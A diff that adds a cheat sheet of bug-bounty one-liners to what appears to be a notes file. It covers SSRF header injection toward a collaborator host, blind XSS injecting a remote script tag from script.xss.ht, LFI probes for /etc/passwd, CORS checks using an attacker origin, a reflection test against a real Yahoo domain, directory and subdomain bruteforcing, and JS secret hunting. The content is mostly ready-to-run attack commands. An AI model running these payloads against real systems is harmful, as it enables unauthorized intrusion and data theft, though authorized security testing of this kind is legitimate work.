@@ -64,5 +64,100 @@ cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | rush -j40 'if curl -skI
 cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
 
 
+## SSRF on doamins:
+# Replace $2 with your burp collaborator server.
+
+cat live-domains | rush -j40 'if curl -skL -o /dev/null "{}" -H "CF-Connecting_IP: $2" -H "From: root@$2" -H "Client-IP: $2" -H "X-Client-IP: $2" -H "X-Forwarded-For: $2" -H "X-Wap-Profile: http://$2/wap.xml" -H "Forwarded: $2" -H "True-Client-IP: $2" -H "Contact: root@$2" -H "X-Originating-IP: $2" -H "X-Real-IP: $2"; then echo "{}" | ts; fi' | tee -a ssrf-headers-out.txt
+
+## SSRF on urls containing parameters:
+
+cat urls.txt | qsreplace "your.burpcollaborator.server" | rush -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
+
+# Test 2:
+
+cat params.txt | qsreplace "http://$1" | rush -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
+
+
+## SpringBoot Actuator Check One Liner on domains:
+
+cat live-domains | rush -j40 'if curl -skI -m 10 "{}/env" | grep -i "x-application-context" || curl -sk -m 10 "{}/actuator/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/env" | grep -q "sping.config.location\|spring.application.name\|JAVA_HOME" || curl -sk -m 10 "{}/actuator" | grep -q '{"_links":{"self"' || curl -sk -m 10 "{}/actuator/configprops" | grep -q "org.springframework.boot.actuate\|beans" || curl -sk -m 10 "{}/configprops" | grep -q "org.springframework.boot.actuate\|beans"; then echo "SpringBoot Actuator Found on {}"; fi' &
+
+
+## cat params.txt | rush -j40 'if curl -skI -m 10 "{}" | grep -i "x-application-context"; then echo "SpringBoot application context header Found on {}"; fi'
+
+
+## Blind XSS:
+
+cat urls.txt | qsreplace '"><script src="https://script.xss.ht"></script>' | rush -j40 'curl -sk "{}" -o /dev/null'
+
+
+## Reflection Check (XSS) on one domain by extracting Hidden params
+
+curl -skL "https://in.yahoo.com" | grep 'type="hidden"' | grep -Eo 'name="[^\"]+"' | cut -d'"' -f2 | xargs -I@ sh -c 'if curl -skL https://in.yahoo.com/?@=testxss | grep -q "value=testxss"; then echo "reflection found from @ parameter"; fi'
+
+
+## Find hidden parameters via Crawl on list of urls
+Explanation – Takes urls list and extracts hidden parameters from the list of urls and saves unique params in the file.
+
+cat alive.txt | rush 'curl -skL "{}" | grep "type\=\"hidden\"" | grep -Eo "name\=\"[^\"]+\"" | cut -d"\"" -f2 | sort -u' | anew params.txt
+
+##  Find Secrets in Javascripts files via crawling:
+
+cat alive.txt | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder
+
+## Directory Bruteforce using dirsearch and ffuf
+
+cat alive.txt | xargs -I@ sh -c 'ffuf -c -w /path/to/wordlist -D -e php,aspx,html,do,ashx -u @/FUZZ -ac -t 200' | tee -a dir-ffuf.txt
+
+## Subdomain bruteforce using ffuf
+
+ffuf -u https://FUZZ.domain.com -w /path/to/wordlist -v | grep "| URL |" | awk '{print $4}'
+
+
+## Hunt LFI
+
+gau http://vuln.target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+## CORS:
+
+
+gau http://vuln.target.com | while read url;do target=$(curl -s -I -H "Origin: https://evvil.com" -X GET $url) | if grep 'https://evvil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
+
+
+## Subdomain takeover testing using subjack
+
+subjack -w subdomains.txt -a -t 100 -v -o takeover.txt -ssl
+
+
+## Get Content-Type
+
+echo abc.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
+
+## Information disclosure:
+
+cat host.txt | httpx -path //server-status?full=true -status-code -content-length
+
+cat host.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -path /web-console/ -status-code -content-length
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
